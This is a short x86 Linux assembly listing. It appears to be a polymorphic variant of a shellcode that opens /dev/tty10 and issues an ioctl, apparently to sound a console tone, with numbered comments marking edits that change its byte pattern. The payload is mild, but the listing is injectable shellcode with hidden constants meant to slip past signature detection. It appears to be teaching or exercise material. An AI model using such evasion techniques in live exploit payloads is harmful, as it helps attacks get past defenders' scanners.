global _start

section .text
_start:
    xor eax, eax                ; change #1
    mul ecx 
    mov cl, 5

loop_inc:                       ; change #2
    inc eax 
    loop loop_inc
    push edx 
    jmp short jump_a            ; change #3
   
call_a:
    pop ebx                     ; change #4
    int 0x80
    xchg ebx, eax               ; change #5
    push byte 54
    pop eax 
    mov ecx, 4294948047
    not ecx 
    mov edx, 66729180
    int 0x80

jump_a:
    call call_a
    db '/dev/tty10'
